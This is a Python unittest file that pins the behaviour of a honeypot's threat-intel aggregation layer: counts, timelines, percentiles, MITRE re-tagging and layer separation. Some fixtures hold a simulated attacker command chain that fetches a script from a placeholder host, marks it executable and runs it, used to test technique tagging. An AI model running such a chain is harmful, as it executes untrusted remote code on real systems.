"""
tests/test_aggregation.py — CHARACTERIZATION tests for the Aggregation layer.

Run:  python3 -m unittest discover -s tests -v     (from the repo root)

These pin what threat_intel/aggregator.py ALREADY DOES. They were written
against the existing implementation without changing a line of it, so a failure
here means behaviour moved — not that the behaviour is wrong. Aggregation is
the foundation Correlation, Detection, Severity and Alerting all read, and a
silent change here surfaces as wrong numbers four layers downstream where
nothing would connect it back.

What gets pinned, in rough order of how much it would hurt to lose:

  * FACTS ONLY. Aggregation counts and distributes. It never rates, scores or
    decides, and `detections` is an empty slot it must never populate.
  * The two streams are never joined — the auth table carries no session_id.
  * MITRE comes from RE-TAGGING the command text, never the stored
    technique_id column (94.6% of which are stale NULLs).
  * exclude_row is applied to BOTH streams, or one page shows two different
    command counts.
  * Absent stays absent: no rate from zero elapsed time, no percentile from an
    empty list.
  * The timeline is contiguous and zero-filled, so a quiet window reads as
    quiet rather than as missing data.

storage is stubbed per-test rather than hitting the real database: these test
the aggregation arithmetic, not SQLite, and a test that depends on whatever
happens to be in hydrapot.db is not a test.
"""
import os
import sys
import unittest
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import storage                                  # noqa: E402
from threat_intel import aggregator as A        # noqa: E402


def row(session="a", ts="2026-01-01 00:00:00", ip="1.1.1.1", cmd="ls",
        agent="cowrie", fi=1, latency=5.0, instance="s1"):
    return {"instance": instance, "session_id": session, "timestamp": ts,
            "src_ip": ip, "agent": agent, "fi_score": fi,
            "latency_ms": latency, "cmd": cmd}


def auth(ts="2026-01-01 00:00:00", ip="1.1.1.1", kind="password",
         event="login.failed", user="root", pw="x", instance="s1"):
    return {"instance": instance, "timestamp": ts, "src_ip": ip,
            "username": user, "password": pw, "auth_type": kind, "event": event}


def _clear_derived_caches():
    try:
        from SIEM.data import clear_caches
        clear_caches()
    except Exception:
        pass        # dashboard layer absent = nothing to poison


class StorageStub:
    """Swaps storage's readers for in-memory lists.

    aggregator does `import storage` then `storage.query_range(...)`, so the
    lookup happens on the module object at call time and patching it works
    without touching aggregator itself.
    """

    def stub(self, rows=(), auth_rows=(), bounds=("2026-01-01 00:00:00",
                                                  "2026-01-01 00:05:00")):
        # Capture the REAL functions once per test. Several tests call stub()
        # more than once (any test whose helper re-stubs before asserting); a
        # second capture would save the previous STUB as the original, and
        # cleanup would then "restore" a stub permanently -- leaving
        # storage.query_range replaced for every later test MODULE in the
        # process. That is what made test_api_v1 see an empty database.
        if not getattr(self, "_saved", None):
            self._saved = {name: getattr(storage, name) for name in
                           ("query_range", "query_auth_range", "query_all",
                            "query_session", "time_bounds")}
            self.addCleanup(lambda: [setattr(storage, k, v)
                                     for k, v in self._saved.items()])
        # Anything derived from stubbed rows must not outlive the stub. The
        # dashboard/API layer caches aggregation and detection results for five
        # minutes, so a call made while storage is stubbed poisoned later test
        # MODULES -- test_api_v1 silently skipped 9 assertions because the
        # pipeline it read had been cached as empty here.
        self.addCleanup(_clear_derived_caches)
        rows, auth_rows = list(rows), list(auth_rows)
        storage.time_bounds = lambda instance=None: bounds
        storage.query_range = lambda s, e, instance=None: list(rows)
        storage.query_auth_range = lambda s, e, instance=None: list(auth_rows)
        storage.query_all = lambda path=None, columns=None: list(rows)
        storage.query_session = lambda sid, instance=None: [
            r for r in rows if r.get("session_id") == sid]
        return rows, auth_rows


# ── pure helpers ────────────────────────────────────────────────────────────

class TestParseTimestamp(unittest.TestCase):

    def test_parses_storage_format(self):
        self.assertEqual(A._parse_ts("2019-08-05 17:50:07"),
                         datetime(2019, 8, 5, 17, 50, 7))

    def test_unparseable_returns_none_rather_than_raising(self):
        """A malformed timestamp must drop one row, never take down a render."""
        for bad in ("not a date", "", None, 12345, "2019-13-45 99:99:99"):
            self.assertIsNone(A._parse_ts(bad), f"{bad!r} should not parse")

    def test_accepts_iso_with_t_separator(self):
        self.assertEqual(A._parse_ts("2019-08-05T17:50:07"),
                         datetime(2019, 8, 5, 17, 50, 7))


class TestPercentile(unittest.TestCase):
    """Nearest-rank, deliberately not numpy."""

    def test_empty_is_none_not_zero(self):
        """Zero would be a fabricated measurement — there is no p50 of nothing."""
        self.assertIsNone(A._percentile([], 50))

    def test_nearest_rank(self):
        vals = [1, 2, 3, 4, 5]
        self.assertEqual(A._percentile(vals, 0), 1)
        self.assertEqual(A._percentile(vals, 50), 3)
        self.assertEqual(A._percentile(vals, 100), 5)

    def test_does_not_interpolate(self):
        """Nearest-rank returns a value that is actually IN the data."""
        self.assertIn(A._percentile([10, 20], 50), (10, 20))

    def test_unsorted_input(self):
        self.assertEqual(A._percentile([5, 1, 3, 2, 4], 50), 3)


class TestBucketSeconds(unittest.TestCase):
    """Buckets snap to a ladder so axis labels stay on human units."""

    def test_snaps_up_to_a_ladder_rung(self):
        for window_s in (600, 86400, 86400 * 365):
            self.assertIn(A._bucket_seconds(window_s, 48), A._BUCKET_LADDER)

    def test_never_below_the_smallest_rung(self):
        self.assertEqual(A._bucket_seconds(1, 48), A._BUCKET_LADDER[0])

    def test_caps_at_the_largest_rung(self):
        self.assertEqual(A._bucket_seconds(86400 * 3650, 48), A._BUCKET_LADDER[-1])

    def test_bigger_window_never_gives_smaller_buckets(self):
        sizes = [A._bucket_seconds(w, 48) for w in
                 (600, 3600, 86400, 86400 * 7, 86400 * 365)]
        self.assertEqual(sizes, sorted(sizes))


class TestChainUsesRetagging(unittest.TestCase):
    """MITRE comes from re-tagging the command text, NEVER the stored column.

    The stored technique_id is a point-in-time snapshot: 6,903 of 7,298
    taggable rows in this database are stale NULLs, and only the PRIMARY
    technique was ever written, so `wget x; chmod +x; sh x` stored one tag for
    four techniques.
    """

    def test_a_stored_tag_is_ignored_entirely(self):
        r = row(cmd="wget http://x/y.sh")
        r["technique_id"] = "T9999-WRONG"
        r["tactic"] = "Nonsense"
        s = A._summarize([r])
        self.assertNotIn("T9999-WRONG", s["technique_ids"])
        self.assertNotIn("Nonsense", s["tactics"])

    def test_a_null_stored_tag_still_produces_techniques(self):
        """The stale-NULL case: reading the column reported "0 downloads" for a
        session that pulled and ran a payload."""
        r = row(cmd="wget http://x/y.sh")
        r["technique_id"] = None
        self.assertTrue(A._summarize([r])["technique_ids"])

    def test_one_row_can_carry_several_techniques(self):
        chained = row(cmd="wget http://x/y.sh; chmod +x y.sh; sh y.sh")
        self.assertGreater(len(A._summarize([chained])["technique_ids"]), 1)


# ── _summarize ──────────────────────────────────────────────────────────────

class TestSummarize(unittest.TestCase):

    def test_no_rows_is_an_empty_dict(self):
        self.assertEqual(A._summarize([]), {})

    def test_counts_and_extremes(self):
        rows = [row(fi=1), row(ts="2026-01-01 00:01:00", fi=4)]
        s = A._summarize(rows)
        self.assertEqual(s["event_count"], 2)
        self.assertEqual(s["max_fi_score"], 4)
        self.assertEqual(s["avg_fi_score"], 2.5)
        self.assertEqual(s["start_time"], "2026-01-01 00:00:00")
        self.assertEqual(s["end_time"], "2026-01-01 00:01:00")
        self.assertEqual(s["duration_s"], 60.0)

    def test_rate_is_none_when_no_time_elapsed(self):
        """A rate cannot be inferred from an instant, and 0 would be a
        fabricated fact. Consumers decide what to do with None."""
        self.assertIsNone(A._summarize([row()])["commands_per_minute"])
        same_second = [row(), row(cmd="whoami")]
        self.assertIsNone(A._summarize(same_second)["commands_per_minute"])

    def test_rate_is_computed_when_time_elapsed(self):
        rows = [row(), row(ts="2026-01-01 00:01:00", cmd="whoami")]
        self.assertEqual(A._summarize(rows)["commands_per_minute"], 2.0)

    def test_tactics_keep_execution_order_not_alphabetical(self):
        """Row order is execution order, and that progression IS the kill
        chain. Sorting would throw away the only temporal information."""
        rows = [row(cmd="uname -a"), row(ts="2026-01-01 00:00:01",
                                         cmd="wget http://x/y.sh")]
        tactics = A._summarize(rows)["tactics"]
        self.assertEqual(tactics, list(dict.fromkeys(tactics)))   # deduped
        reversed_rows = list(reversed(rows))
        self.assertNotEqual(A._summarize(reversed_rows)["tactics"], tactics)

    def test_missing_numeric_fields_default_to_zero_not_crash(self):
        bare = {"session_id": "a", "timestamp": "2026-01-01 00:00:00",
                "src_ip": "1.1.1.1", "cmd": "ls"}
        s = A._summarize([bare])
        self.assertEqual(s["max_fi_score"], 0)
        self.assertEqual(s["total_latency_ms"], 0.0)
        self.assertEqual(s["agents_used"], {"unknown": 1})

    def test_costs_are_split_by_currency_never_summed(self):
        """On-device cost is electricity (THB), cloud cost is API billing
        (USD). Summing them would need an exchange rate this codebase has no
        measured source for."""
        rows = [row(agent="on_device", latency=1000.0),
                row(agent="cloud", ts="2026-01-01 00:00:01")]
        s = A._summarize(rows)
        self.assertIn("electricity_cost_thb", s)
        self.assertIn("cloud_cost_usd", s)
        self.assertNotIn("total_cost", s)

    def test_only_on_device_latency_feeds_electricity(self):
        cloud_only = A._summarize([row(agent="cloud", latency=9999.0)])
        self.assertEqual(cloud_only["electricity_cost_thb"], 0)

    def test_high_risk_count_uses_the_configured_threshold(self):
        from config_loader import load_config
        thr = load_config().logging.fi_threshold
        rows = [row(fi=thr), row(ts="2026-01-01 00:00:01", fi=thr - 1)]
        self.assertEqual(A._summarize(rows)["high_risk_count"], 1)


# ── resolve_window ──────────────────────────────────────────────────────────

class TestResolveWindow(StorageStub, unittest.TestCase):

    BOUNDS = ("2019-01-01 00:00:00", "2019-08-05 18:00:00")

    def test_explicit_start_and_end_win(self):
        self.stub(bounds=self.BOUNDS)
        w = A.resolve_window(preset="24h", start="2020-01-01 00:00:00",
                             end="2020-01-02 00:00:00")
        self.assertEqual((w["start"], w["end"]),
                         ("2020-01-01 00:00:00", "2020-01-02 00:00:00"))
        self.assertIsNone(w["preset"])

    def test_all_spans_the_whole_capture(self):
        self.stub(bounds=self.BOUNDS)
        w = A.resolve_window(preset="ALL")
        self.assertEqual((w["start"], w["end"]), self.BOUNDS)

    def test_preset_is_measured_from_the_data_not_the_wall_clock(self):
        """This database spans 2019 to today. Anchoring "last 24h" on now()
        renders an empty page against any historical capture."""
        self.stub(bounds=self.BOUNDS)
        w = A.resolve_window(preset="24h")
        self.assertEqual(w["end"], self.BOUNDS[1])
        self.assertEqual(w["start"], "2019-08-04 18:00:00")

    def test_window_never_starts_before_the_data_does(self):
        """An empty leading span just squashes the timeline."""
        self.stub(bounds=self.BOUNDS)
        w = A.resolve_window(preset="7d", reference="2019-01-01 06:00:00")
        self.assertEqual(w["start"], self.BOUNDS[0])

    def test_default_preset_is_24h(self):
        self.stub(bounds=self.BOUNDS)
        self.assertEqual(A.resolve_window()["preset"], "24h")

    def test_empty_database_falls_back_to_the_clock(self):
        self.stub(bounds=(None, None))
        w = A.resolve_window(preset="ALL")
        self.assertIsNotNone(A._parse_ts(w["start"]))
        self.assertIsNotNone(A._parse_ts(w["end"]))

    def test_unknown_preset_uses_24h_but_reports_the_name_it_was_given(self):
        """Characterization, not endorsement: an unrecognised preset silently
        gets 24h of data while echoing the bogus name back to the caller. A UI
        rendering win['preset'] would display a preset that was never applied.
        """
        self.stub(bounds=self.BOUNDS)
        w = A.resolve_window(preset="nonsense")
        self.assertEqual(w["preset"], "nonsense")
        self.assertEqual(w["start"], "2019-08-04 18:00:00")      # 24h of data


# ── aggregate_overview ──────────────────────────────────────────────────────

class TestOverview(StorageStub, unittest.TestCase):

    ROWS = [row(session="a", ts="2026-01-01 00:00:00", ip="1.1.1.1", cmd="ls"),
            row(session="a", ts="2026-01-01 00:00:30", ip="1.1.1.1",
                cmd="wget http://x/y.sh", agent="cloud", fi=4, latency=900.0),
            row(session="b", ts="2026-01-01 00:02:00", ip="2.2.2.2",
                cmd="whoami", agent="on_device", fi=2, latency=40.0)]
    AUTH = [auth(ts="2026-01-01 00:00:05", event="login.failed"),
            auth(ts="2026-01-01 00:00:06", event="login.success", pw="y"),
            auth(ts="2026-01-01 00:00:01", ip="3.3.3.3", kind="tcp_connect",
                 event="connection")]
    BOUNDS = ("2026-01-01 00:00:00", "2026-01-01 00:02:00")

    def overview(self, **kw):
        self.stub(self.ROWS, self.AUTH, self.BOUNDS)
        return A.aggregate_overview(preset="ALL", **kw)

    def test_returns_every_documented_section(self):
        self.assertEqual(sorted(self.overview()), [
            "activity", "categories", "detections", "funnel", "iocs", "mitre",
            "operational", "session_stats", "sessions", "source_ips",
            "timeline", "window"])

    def test_detections_is_always_empty(self):
        """A slot reserved for the detection layer's output to be COUNTED in.
        Aggregation must never populate it — that is what keeps the layers
        separable."""
        self.assertEqual(self.overview()["detections"], {})

    def test_activity_counts(self):
        a = self.overview()["activity"]
        self.assertEqual(a["command_count"], 3)
        self.assertEqual(a["session_count"], 2)
        self.assertEqual(a["distinct_src_ips"], 2)

    def test_funnel_is_counted_from_the_auth_stream_only(self):
        f = self.overview()["funnel"]
        self.assertEqual(f["connections"], 1)
        self.assertEqual(f["login_attempts"], 2)     # password rows only
        self.assertEqual(f["login_success"], 1)
        self.assertEqual(f["login_failed"], 1)
        self.assertEqual(f["distinct_auth_ips"], 2)

    def test_streams_are_never_joined(self):
        """The auth table carries no session_id, so any login->session mapping
        would be an invented correlation on (src_ip, time). An auth-only IP
        must never appear as session activity."""
        o = self.overview()
        self.assertNotIn("3.3.3.3", [s["src_ip"] for s in o["source_ips"]])
        self.assertEqual(o["activity"]["distinct_src_ips"], 2)   # not 3
        for s in o["sessions"]:
            self.assertNotIn("login", " ".join(s.keys()))

    def test_timeline_is_contiguous_and_zero_filled(self):
        """A quiet minute must read as quiet, not as missing data."""
        tl = self.overview()["timeline"]
        self.assertGreaterEqual(len(tl), 3)
        self.assertTrue(any(b["commands"] == 0 for b in tl))
        starts = [A._parse_ts(b["bucket_start"]) for b in tl]
        self.assertEqual(starts, sorted(starts))
        gaps = {(starts[i + 1] - starts[i]).total_seconds()
                for i in range(len(starts) - 1)}
        self.assertEqual(len(gaps), 1, "bucket spacing is not uniform")

    def test_timeline_totals_match_activity(self):
        o = self.overview()
        self.assertEqual(sum(b["commands"] for b in o["timeline"]),
                         o["activity"]["command_count"])
        self.assertEqual(sum(b["logins"] for b in o["timeline"]),
                         o["funnel"]["login_attempts"])

    def test_source_ips_are_ordered_by_volume(self):
        """A fact, not a danger ranking.

        The fixture deliberately makes the busiest address sort LAST
        alphabetically. With 1.1.1.1 busiest, volume order and name order are
        the same list and the test cannot tell which one produced it — it
        passed against a mutation that sorted by name.
        """
        rows = [row(ip="9.9.9.9", ts="2026-01-01 00:00:00"),
                row(ip="9.9.9.9", ts="2026-01-01 00:00:01"),
                row(ip="9.9.9.9", ts="2026-01-01 00:00:02"),
                row(ip="1.1.1.1", ts="2026-01-01 00:00:03")]
        self.stub(rows, [], ("2026-01-01 00:00:00", "2026-01-01 00:00:03"))
        ips = A.aggregate_overview(preset="ALL")["source_ips"]
        self.assertEqual([i["src_ip"] for i in ips], ["9.9.9.9", "1.1.1.1"])
        self.assertEqual([i["commands"] for i in ips], [3, 1])

    def test_source_ip_login_attempts_come_from_the_auth_stream(self):
        ips = {i["src_ip"]: i for i in self.overview()["source_ips"]}
        self.assertEqual(ips["1.1.1.1"]["login_attempts"], 2)
        self.assertEqual(ips["2.2.2.2"]["login_attempts"], 0)

    def test_sessions_carry_facts_and_no_score(self):
        for s in self.overview()["sessions"]:
            self.assertEqual(set(s) & {"score", "risk", "severity", "rank",
                                       "priority"}, set())
            self.assertIn("technique_count", s)
            self.assertIn("commands", s)

    def test_mitre_coverage_adds_up(self):
        cov = self.overview()["mitre"]["coverage"]
        self.assertEqual(cov["tagged"] + cov["untagged"], cov["total"])
        self.assertEqual(cov["total"], 3)

    def test_mitre_techniques_are_ordered_by_count(self):
        """Same trap as source_ips: a fixture whose counts are already tied
        cannot distinguish "ordered by count" from "in whatever order the
        dict happened to be built". This one repeats one command so its
        technique genuinely outranks the others.
        """
        rows = ([row(cmd="wget http://x/y.sh", ts=f"2026-01-01 00:00:0{i}")
                 for i in range(4)] +
                [row(cmd="uname -a", ts="2026-01-01 00:00:05")])
        self.stub(rows, [], ("2026-01-01 00:00:00", "2026-01-01 00:00:05"))
        techs = A.aggregate_overview(preset="ALL")["mitre"]["techniques"]
        counts = [t["count"] for t in techs]
        self.assertEqual(counts, sorted(counts, reverse=True))
        self.assertGreater(counts[0], counts[-1], "fixture has no rank to test")

    def test_operational_metrics_are_separated_from_security_facts(self):
        """FI, agent routing and cost describe how the honeypot RAN, not what
        the attacker did. They live in their own section so a consumer cannot
        mistake FI for severity."""
        o = self.overview()
        self.assertIn("fi_distribution", o["operational"])
        for section in ("activity", "funnel", "mitre"):
            self.assertNotIn("fi_distribution", o[section])

    def test_session_stats_bands_cover_every_session(self):
        st = self.overview()["session_stats"]
        self.assertEqual(sum(st["duration_bands"].values()),
                         self.overview()["activity"]["session_count"])

    def test_window_reports_its_own_bucket_size(self):
        w = self.overview()["window"]
        self.assertIn(w["bucket_seconds"], A._BUCKET_LADDER)

    def test_categories_come_from_config_not_hardcoded_here(self):
        from config_loader import load_config
        expected = set(load_config().aggregation.get("categories", {}))
        self.assertEqual(set(self.overview()["categories"]), expected)


class TestExcludeRow(StorageStub, unittest.TestCase):
    """The caller owns the policy of what counts as real traffic; aggregation
    only applies it. It must reach BOTH streams — without that the same page
    showed 16,409 commands in one block and 2,788 in another."""

    def test_applies_to_session_rows(self):
        rows = [row(ip="1.1.1.1"), row(ip="harness_1", ts="2026-01-01 00:00:01")]
        self.stub(rows, [], ("2026-01-01 00:00:00", "2026-01-01 00:00:01"))
        o = A.aggregate_overview(
            preset="ALL", exclude_row=lambda r: r.get("src_ip") == "harness_1")
        self.assertEqual(o["activity"]["command_count"], 1)

    def test_applies_to_auth_rows_too(self):
        auths = [auth(ip="1.1.1.1"), auth(ip="harness_1")]
        self.stub([], auths, ("2026-01-01 00:00:00", "2026-01-01 00:00:01"))
        o = A.aggregate_overview(
            preset="ALL", exclude_row=lambda r: r.get("src_ip") == "harness_1")
        self.assertEqual(o["funnel"]["login_attempts"], 1)
        self.assertEqual(o["funnel"]["distinct_auth_ips"], 1)

    def test_no_exclude_row_keeps_everything(self):
        rows = [row(ip="1.1.1.1"), row(ip="harness_1", ts="2026-01-01 00:00:01")]
        self.stub(rows, [], ("2026-01-01 00:00:00", "2026-01-01 00:00:01"))
        self.assertEqual(
            A.aggregate_overview(preset="ALL")["activity"]["command_count"], 2)


class TestEmptyWindow(StorageStub, unittest.TestCase):
    """A window with nothing in it is a correct result, not an error."""

    def test_no_rows_still_returns_the_full_shape(self):
        self.stub([], [], ("2026-01-01 00:00:00", "2026-01-01 00:05:00"))
        o = A.aggregate_overview(preset="ALL")
        self.assertEqual(o["activity"]["command_count"], 0)
        self.assertEqual(o["activity"]["session_count"], 0)
        self.assertEqual(o["sessions"], [])
        self.assertEqual(o["source_ips"], [])
        self.assertEqual(o["detections"], {})

    def test_percentiles_are_none_not_zero_when_there_is_nothing(self):
        self.stub([], [], ("2026-01-01 00:00:00", "2026-01-01 00:05:00"))
        st = A.aggregate_overview(preset="ALL")["session_stats"]
        self.assertIsNone(st["duration_p50_s"])
        self.assertIsNone(st["commands_p50"])

    def test_rows_with_unparseable_timestamps_are_skipped_not_fatal(self):
        rows = [row(), row(ts="garbage", cmd="whoami")]
        self.stub(rows, [], ("2026-01-01 00:00:00", "2026-01-01 00:05:00"))
        o = A.aggregate_overview(preset="ALL")
        self.assertEqual(o["activity"]["command_count"], 2)   # still counted
        self.assertEqual(sum(b["commands"] for b in o["timeline"]), 1)  # not bucketed


# ── session / window aggregation ────────────────────────────────────────────

class TestAggregateSession(StorageStub, unittest.TestCase):

    def test_summarises_one_session(self):
        rows = [row(session="a"), row(session="a", ts="2026-01-01 00:01:00",
                                      cmd="whoami"),
                row(session="b", cmd="id")]
        self.stub(rows)
        s = A.aggregate_session("a")
        self.assertEqual(s["event_count"], 2)
        self.assertEqual(s["session_id"], "a")

    def test_unknown_session_is_an_empty_dict_with_no_id(self):
        """{} rather than a zero-filled summary: a session that does not exist
        has no facts, and inventing them would let a caller render a page for
        a session id that was never seen."""
        self.stub([row(session="a")])
        self.assertEqual(A.aggregate_session("does-not-exist"), {})


class TestAggregateAllSessions(StorageStub, unittest.TestCase):

    def test_one_summary_per_session(self):
        rows = [row(session="a"), row(session="a", ts="2026-01-01 00:00:01"),
                row(session="b")]
        self.stub(rows)
        out = A.aggregate_all_sessions()
        self.assertEqual(len(out), 2)
        self.assertEqual({s["session_id"] for s in out}, {"a", "b"})

    def test_instance_filter(self):
        rows = [row(session="a", instance="s1"), row(session="b", instance="s2")]
        self.stub(rows)
        self.assertEqual([s["session_id"] for s in A.aggregate_all_sessions(
            instance="s2")], ["b"])

    def test_all_instance_keyword_means_no_filter(self):
        rows = [row(session="a", instance="s1"), row(session="b", instance="s2")]
        self.stub(rows)
        self.assertEqual(len(A.aggregate_all_sessions(instance="all")), 2)


class TestAggregateTimeWindows(StorageStub, unittest.TestCase):

    def test_buckets_by_source_and_window(self):
        rows = [row(ip="1.1.1.1", ts="2026-01-01 00:00:00"),
                row(ip="1.1.1.1", ts="2026-01-01 00:01:00"),
                row(ip="1.1.1.1", ts="2026-01-01 00:30:00"),
                row(ip="2.2.2.2", ts="2026-01-01 00:00:00")]
        self.stub(rows)
        out = A.aggregate_time_windows(window_minutes=5)
        # 1.1.1.1 in two different 5-minute buckets, 2.2.2.2 in one
        self.assertEqual(len(out), 3)
        self.assertTrue(all(s["window_minutes"] == 5 for s in out))

    def test_newest_window_first(self):
        rows = [row(ts="2026-01-01 00:00:00"), row(ts="2026-01-01 02:00:00")]
        self.stub(rows)
        starts = [s["window_start"] for s in A.aggregate_time_windows(window_minutes=5)]
        self.assertEqual(starts, sorted(starts, reverse=True))

    def test_since_limits_the_scan(self):
        rows = [row(ts="2026-01-01 00:00:00"), row(ts="2026-01-02 00:00:00")]
        self.stub(rows)
        out = A.aggregate_time_windows(window_minutes=5,
                                       since=datetime(2026, 1, 1, 12, 0, 0))
        self.assertEqual(len(out), 1)

    def test_unparseable_timestamps_are_skipped(self):
        self.stub([row(ts="garbage")])
        self.assertEqual(A.aggregate_time_windows(window_minutes=5), [])


# ── layer separation ────────────────────────────────────────────────────────

class TestAggregationDecidesNothing(StorageStub, unittest.TestCase):
    """Aggregation counts and distributes. It does not rate, score or judge —
    that is the seam every layer above it depends on."""

    def test_no_section_carries_a_verdict_field(self):
        self.stub([row(cmd="wget http://x/y.sh; chmod +x y.sh; sh y.sh")],
                  [], ("2026-01-01 00:00:00", "2026-01-01 00:01:00"))
        o = A.aggregate_overview(preset="ALL")
        banned = {"severity", "score", "risk", "risk_score", "malicious",
                  "threat_level", "confidence", "priority"}
        for name, section in o.items():
            if isinstance(section, dict):
                self.assertEqual(set(section) & banned, set(),
                                 f"{name} carries a verdict field")

    def test_module_never_imports_the_layers_above_it(self):
        """Dependencies run one way. aggregator -> mitre/ioc/cost, never
        aggregator -> correlation/detection/severity/alerting."""
        src = open(A.__file__, encoding="utf-8").read()
        code = "\n".join(ln for ln in src.splitlines()
                         if not ln.strip().startswith("#"))
        for upper in ("import correlation", "import detection",
                      "import severity", "import alert_records",
                      "from threat_intel.correlation", "from threat_intel.detection",
                      "from threat_intel.severity", "from threat_intel.alert_records"):
            self.assertNotIn(upper, code)


if __name__ == "__main__":
    unittest.main(verbosity=2)
